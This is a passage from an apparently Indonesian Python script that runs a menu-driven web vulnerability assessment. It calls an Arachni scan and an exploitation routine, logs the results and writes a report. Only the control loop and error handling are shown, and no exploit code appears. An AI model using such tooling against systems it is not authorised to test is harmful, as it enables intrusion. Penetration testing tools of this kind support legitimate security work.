        catat_log("=== OTOMATISASI PENILAIAN WEB ) DIMULAI ===")
        with open(LOG_EKSPLOIT, 'w') as f:
            f.write(f"Log Eksploitasi - {datetime.now().isoformat()}\n{'='*50}\n")

        if pilihan == '1':
            semua_isu, web_vulns, hasil_eksploit = run_arachni_only()
        elif pilihan == '2':
            semua_isu, web_vulns, hasil_eksploit = run_exploit_only()
        elif pilihan == '3':
            semua_isu, web_vulns, hasil_eksploit = run_both()
        else:
            print("Pilihan tidak valid. Silakan pilih 1-4.")
            continue

        if semua_isu is None:  # terjadi error
            continue

        # Buat laporan
        catat_log("=== MEMBUAT LAPORAN ===")
        buat_laporan(semua_isu, web_vulns, hasil_eksploit)

        waktu_selesai = time.time() - waktu_mulai
        catat_log(f"=== PENILAIAN SELESAI dalam {waktu_selesai/60:.2f} menit ===")
        print("\nLaporan tersimpan di folder:", DIR_LAPORAN)
        input("Tekan Enter untuk kembali ke menu...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        catat_log("Penilaian dihentikan oleh pengguna", "WARNING")
        sys.exit(0)
    except Exception as e:
        catat_log(f"Kesalahan fatal: {e}", "ERROR")
        import traceback
        traceback.print_exc()
        sys.exit(1)
